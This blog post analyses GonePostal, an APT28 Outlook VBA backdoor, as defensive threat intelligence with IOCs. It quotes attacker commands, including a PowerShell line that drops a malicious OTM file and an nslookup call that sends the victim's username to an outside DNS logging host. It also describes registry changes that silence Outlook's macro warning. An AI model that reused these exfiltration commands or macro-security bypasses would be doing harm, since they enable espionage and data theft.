---
title: "Analysis of GonePostal: APT28’s Custom VBA Backdoor for Microsoft Outlook"
date: 2026-02-09
categories: [Malware]
tags: [malware,apt28]
---

## Overview
KTA007, also known as Fancy Bear, APT28, and Pawn Storm, is a state sponsored political and economic espionage group associated with the Russian Military’s Main Intelligence Directorate (GRU) Unit 26165. The group has been implicated in several high-profile cyberattacks such as the 2016 Democratic National Committee breach, the International Olympic Committee, the Norwegian Parliament and others. They are known to utilize techniques and tools ranging from zero-day exploitation, spear phishing and a mixture of commercial and custom malware.

## Technical Breakdown
This campaign first start by dropping a unsigned malicious dll which pretends to be a legitimate Microsoft signed DLL of same name, and this malicious dll uses its export table to forward all exported lib functions to legitimate DLL which is named as `tmp7EC9.dll`. The entry point of the malicious dll contained encoded Powershell commands such as `$a=$env:APPDATA;copy testtemp.ini "$a\Microsoft\Outlook\VbaProject.OTM"` which drops a otm file but since I dont have this dll sample I downloaded same `.xls` file which has the VBA script, `nslookup "$env:USERNAME.8bf50371-5f9f-4d45-9320-922b068ebc2e.dnshook.site"` this sends the username of victim to attackers **dnshook, webhook, oast.fun**. Now the next half of DLLMain function modifies the registry keys `LoadMacroProviderOn, Level, and PONT_STRING` which enables to load macro whenever outlook starts and `PONT_STRING` value of 32 maps to the dialog box that would normally warn the user of content being downloaded. By setting this value the malware has stopped this dialog box being shown to the user.

Upon getting the `.xls` file I knew that it will have a macro script so I quickly dumped it and on a quick look things I noticed are functions like `CreateProcessW, TerminateProcess, CreateFileW, WriteFile` and others. Initially it has so many scrambled strings and symbols so that made a logic of script a bit difficult to analyze. 

![vba](./assets/lib/gonepostel/vba.png)
*Figure 1: Initialization Function*

Down the script I found initialization function of the script and since the symbols and variables names are resued throughout code so it can be reconstructed to more human readable format. Most of them are just base64 encodes but there was a implementation that read after `14 offset` in some raw base64 like `oQNfWDdmfdvnOnYQAuAG0AYQB0AHQAaQA0ADQANABAAHAAcgBvAHQAbwBuAC4AbQBlAA==` which will give gibberish data but when decoded after 14th offset it will lead to a email `a.matti444@proton.me`.

![vba1](./assets/lib/gonepostel/vba1.png)
*Figure 2: Initialization Function after reconstruction*

![vba2](./assets/lib/gonepostel/vba2.png)
*Figure 3: Keywords and filetypes*

After reconstructing the initialization function, it uncovered some details about the config and moving forward it also decodes some filetypes and keywords. On starup of `Outlook` it triggers `Application_MAPILogonComplete()` which calls `Init()` to decode configuration strings, set up directories and prepare payloads.

![vba3](./assets/lib/gonepostel/vba3.png)
*Figure 4: Mail Listening Function*

`Application_NewMailEx()` waits for new mails, When a new mail arrives they are added dictionary list of mail items and parsed by `HandleMailItem()`, it adds commands received from C2 to queue ensure that no bad email crash the whole process. If valid commands exist, it calls `FinalizeMailItem` to execute them. After commands are processed and then the emails are deleted from both the inbox and the deleted folder.

![vba4](./assets/lib/gonepostel/vba4.png)
*Figure 5: C2 payload decoding*

`ProcessMailPayload()` then extracts encoded data received from C2 and create task items with them and returning a command result, the encoding is base64 here as well but with different defined offset which is similar as decoding done in `init()` function.

![vba5](./assets/lib/gonepostel/vba5.png)
*Figure 6: Command Execution Function*

`FinalMailItem()` is responsible for command execution and response, it iterates through main items and pass the command to dispatch function for main execution and returns reponse of payloads. `Execute()` is responsible for taking the stolen files, commands output, logs packs them into a new mail and sends back to the attacker.

![vba6](./assets/lib/gonepostel/vba6.png)
*Figure 7: Dispatch Payload Command function*

`DispatchPayloadCommand()` handles four main commands that we have seen in the `init()` function and anything else will get rejected and get logged. It also implements a Command argument parser for parsing raw string sent by attacker and break them down into targetPath, and search pattern such as `*.docx`.

![vba7](./assets/lib/gonepostel/vba7.png)
*Figure 8: FileEncoding*

```vba
SliceResult = SliceByteArray(RawData, i * ChunkSize, CurrentChunkSize)
ChunkBytes = SliceResult.Success
Result.Message = Result.Message & SliceResult.Message

WriteResult = WriteBytesToFile(OutputPath, ChunkBytes, 0, Length(ChunkBytes))
Result.Message = Result.Message & WriteResult.Message
```

It reads the original file and encodes it using base64 and removes the original file, following these operations the files are split into chunks for transfer and it uses same config from `init()` for chunking files into aprrox **3MB** then these byte chunks are written into file for transfer. And it uses this same process but in reverse order to save attachments from emails to get original format.

For command execution it uses `cmd` that captures output and another `cmdNo` which does not show any output So that these captured outputs are send back to C2.

![vba8](./assets/lib/gonepostel/vba8.png)
*Figure 9: PowerShell Command Execution*

## Conclusion
The campaign uses common business tools and methods of communication for command and control. Interception of email communications and a platform for sending to C2 over legitimate means enables a stealth manner of access which could be difficult to detect.

![flowchart](./assets/lib/gonepostel/flowchart.png)
*Figure 10: Execution Chain of malware*

## IOCs
* C2 Mail: `a.matti444@proton.me`
* DNS Exfil
```powershell
$env:USERNAME.8bf50371-5f9f-4d45-9320-922b068ebc2e.dnshook.site
https[:]//webhook[.]site/8bf50371-5f9f-4d45-9320-922b068ebc2e?$env:USERNAME
$env:USERNAME.wcyjpnuxotpaebuijrtn3urwx1zeg223v.oast.fun
```
* Malicious DLL: `SSPICLI.dll`
* Legitimate DLL: `tmp7EC9.dll`
* Hashes:
```
2dc21fab89bca42d2de4711a7ef367f1 -> SSPICLI.dll
3e966f088d46a0eb482e3dc4af266c0f -> tmp7EC9.dll
f8d9b7c864fb7558e8bad4cfb5c8e6ff -> testtemp.xls
```